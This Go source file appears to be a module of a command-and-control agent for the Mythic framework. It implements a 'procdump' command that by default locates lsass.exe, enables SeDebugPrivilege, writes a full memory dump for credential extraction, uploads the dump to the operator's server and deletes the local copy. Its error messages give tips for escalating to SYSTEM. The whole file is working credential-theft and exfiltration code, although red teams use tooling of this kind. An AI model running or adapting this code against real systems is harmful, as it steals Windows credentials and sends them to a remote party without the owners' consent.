//go:build windows
// +build windows

package commands

import (
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"
	"unsafe"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows"
)

// MiniDumpWriteDump constants
const (
	MiniDumpNormal         = 0x00000000
	MiniDumpWithFullMemory = 0x00000002
)

var (
	dbghelp               = windows.NewLazySystemDLL("dbghelp.dll")
	procMiniDumpWriteDump = dbghelp.NewProc("MiniDumpWriteDump")
)

// ProcdumpCommand implements process memory dumping
type ProcdumpCommand struct{}

func (c *ProcdumpCommand) Name() string {
	return "procdump"
}

func (c *ProcdumpCommand) Description() string {
	return "Dump process memory using MiniDumpWriteDump (requires SeDebugPrivilege for protected processes)"
}

type procdumpArgs struct {
	Action string `json:"action"`
	PID    int    `json:"pid"`
}

func (c *ProcdumpCommand) Execute(task structs.Task) structs.CommandResult {
	var args procdumpArgs
	if task.Params != "" {
		if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
			return structs.CommandResult{
				Output:    fmt.Sprintf("Failed to parse parameters: %v", err),
				Status:    "error",
				Completed: true,
			}
		}
	}

	if args.Action == "" {
		args.Action = "lsass"
	}

	// Enable SeDebugPrivilege on both process and thread tokens
	// Thread token is needed when impersonating (e.g., after getsystem)
	enableDebugPrivilege()
	enableThreadDebugPrivilege()

	var targetPID uint32
	var processName string

	switch strings.ToLower(args.Action) {
	case "lsass":
		pid, name, err := findProcessByName("lsass.exe")
		if err != nil {
			return structs.CommandResult{
				Output:    fmt.Sprintf("Failed to find lsass.exe: %v", err),
				Status:    "error",
				Completed: true,
			}
		}
		targetPID = pid
		processName = name
	case "dump":
		if args.PID <= 0 {
			return structs.CommandResult{
				Output:    "Error: -pid is required for dump action",
				Status:    "error",
				Completed: true,
			}
		}
		targetPID = uint32(args.PID)
		name, _ := getProcessName(targetPID)
		if name == "" {
			processName = fmt.Sprintf("PID_%d", targetPID)
		} else {
			processName = name
		}
	default:
		return structs.CommandResult{
			Output:    fmt.Sprintf("Unknown action: %s. Available: lsass, dump", args.Action),
			Status:    "error",
			Completed: true,
		}
	}

	// Open target process
	hProcess, err := windows.OpenProcess(
		windows.PROCESS_QUERY_INFORMATION|windows.PROCESS_VM_READ,
		false,
		targetPID,
	)
	if err != nil {
		errMsg := fmt.Sprintf("OpenProcess failed for PID %d (%s): %v", targetPID, processName, err)
		if strings.EqualFold(processName, "lsass.exe") {
			errMsg += "\nPossible causes:"
			errMsg += "\n  - LSASS is running as Protected Process Light (PPL) — check RunAsPPL registry key"
			errMsg += "\n  - Credential Guard is enabled"
			errMsg += "\n  - Insufficient privileges (need SYSTEM + SeDebugPrivilege)"
			errMsg += "\nTip: Try 'getsystem' first, or dump a non-PPL process with -action dump -pid <PID>"
		} else {
			errMsg += "\nEnsure you have admin privileges and SeDebugPrivilege."
		}
		return structs.CommandResult{
			Output:    errMsg,
			Status:    "error",
			Completed: true,
		}
	}
	defer windows.CloseHandle(hProcess)

	// Create temp file for the dump
	tempDir := os.TempDir()
	dumpFileName := fmt.Sprintf("%s_%d.dmp", strings.TrimSuffix(processName, ".exe"), time.Now().Unix())
	dumpPath := filepath.Join(tempDir, dumpFileName)

	dumpFile, err := os.Create(dumpPath)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to create dump file %s: %v", dumpPath, err),
			Status:    "error",
			Completed: true,
		}
	}

	// Use MiniDumpWithFullMemory for credential extraction
	dumpType := uint32(MiniDumpWithFullMemory)

	ret, _, callErr := procMiniDumpWriteDump.Call(
		uintptr(hProcess),
		uintptr(targetPID),
		dumpFile.Fd(),
		uintptr(dumpType),
		0, // ExceptionParam
		0, // UserStreamParam
		0, // CallbackParam
	)

	dumpFile.Close()

	if ret == 0 {
		os.Remove(dumpPath)
		return structs.CommandResult{
			Output:    fmt.Sprintf("MiniDumpWriteDump failed for PID %d (%s): %v", targetPID, processName, callErr),
			Status:    "error",
			Completed: true,
		}
	}

	// Get dump file info
	fi, err := os.Stat(dumpPath)
	if err != nil {
		os.Remove(dumpPath)
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to stat dump file: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	dumpSize := fi.Size()

	// Open the dump file for transfer
	file, err := os.Open(dumpPath)
	if err != nil {
		os.Remove(dumpPath)
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to open dump file for transfer: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Upload via Mythic file transfer
	downloadMsg := structs.SendFileToMythicStruct{}
	downloadMsg.Task = &task
	downloadMsg.IsScreenshot = false
	downloadMsg.SendUserStatusUpdates = true
	downloadMsg.File = file
	downloadMsg.FileName = dumpFileName
	downloadMsg.FullPath = dumpPath
	downloadMsg.FinishedTransfer = make(chan int, 2)

	task.Job.SendFileToMythic <- downloadMsg

	// Wait for transfer to complete
	for {
		select {
		case <-downloadMsg.FinishedTransfer:
			file.Close()
			os.Remove(dumpPath)
			return structs.CommandResult{
				Output:    fmt.Sprintf("Successfully dumped %s (PID %d)\nDump size: %s\nFile uploaded to Mythic and cleaned from disk.", processName, targetPID, formatDumpSize(dumpSize)),
				Status:    "success",
				Completed: true,
			}
		case <-time.After(1 * time.Second):
			if task.DidStop() {
				file.Close()
				os.Remove(dumpPath)
				return structs.CommandResult{
					Output:    "Dump upload cancelled",
					Status:    "error",
					Completed: true,
				}
			}
		}
	}
}

// findProcessByName finds a process PID by its executable name
func findProcessByName(name string) (uint32, string, error) {
	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return 0, "", fmt.Errorf("CreateToolhelp32Snapshot: %v", err)
	}
	defer windows.CloseHandle(snapshot)

	var entry windows.ProcessEntry32
	entry.Size = uint32(unsafe.Sizeof(entry))

	err = windows.Process32First(snapshot, &entry)
	if err != nil {
		return 0, "", fmt.Errorf("Process32First: %v", err)
	}

	for {
		exeName := windows.UTF16ToString(entry.ExeFile[:])
		if strings.EqualFold(exeName, name) {
			return entry.ProcessID, exeName, nil
		}

		err = windows.Process32Next(snapshot, &entry)
		if err != nil {
			break
		}
	}

	return 0, "", fmt.Errorf("process %s not found", name)
}

// getProcessName gets the executable name for a given PID
func getProcessName(pid uint32) (string, error) {
	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return "", err
	}
	defer windows.CloseHandle(snapshot)

	var entry windows.ProcessEntry32
	entry.Size = uint32(unsafe.Sizeof(entry))

	err = windows.Process32First(snapshot, &entry)
	if err != nil {
		return "", err
	}

	for {
		if entry.ProcessID == pid {
			return windows.UTF16ToString(entry.ExeFile[:]), nil
		}
		err = windows.Process32Next(snapshot, &entry)
		if err != nil {
			break
		}
	}

	return "", fmt.Errorf("PID %d not found", pid)
}

// enableThreadDebugPrivilege enables SeDebugPrivilege on the current thread's
// impersonation token. This is needed when running under an impersonated context
// (e.g., after getsystem) because OpenProcess uses the thread token for access checks.
func enableThreadDebugPrivilege() error {
	var token windows.Token
	err := windows.OpenThreadToken(windows.CurrentThread(), windows.TOKEN_ADJUST_PRIVILEGES|windows.TOKEN_QUERY, false, &token)
	if err != nil {
		// No impersonation token — process token is used (enableDebugPrivilege handles that)
		return err
	}
	defer token.Close()

	var luid windows.LUID
	err = windows.LookupPrivilegeValue(nil, windows.StringToUTF16Ptr("SeDebugPrivilege"), &luid)
	if err != nil {
		return err
	}

	tp := windows.Tokenprivileges{
		PrivilegeCount: 1,
		Privileges: [1]windows.LUIDAndAttributes{
			{
				Luid:       luid,
				Attributes: windows.SE_PRIVILEGE_ENABLED,
			},
		},
	}

	return windows.AdjustTokenPrivileges(token, false, &tp, 0, nil, nil)
}

// formatDumpSize formats bytes into human-readable size
func formatDumpSize(bytes int64) string {
	const (
		KB = 1024
		MB = 1024 * KB
		GB = 1024 * MB
	)
	switch {
	case bytes >= GB:
		return fmt.Sprintf("%.1f GB", float64(bytes)/float64(GB))
	case bytes >= MB:
		return fmt.Sprintf("%.1f MB", float64(bytes)/float64(MB))
	case bytes >= KB:
		return fmt.Sprintf("%.1f KB", float64(bytes)/float64(KB))
	default:
		return fmt.Sprintf("%d bytes", bytes)
	}
}
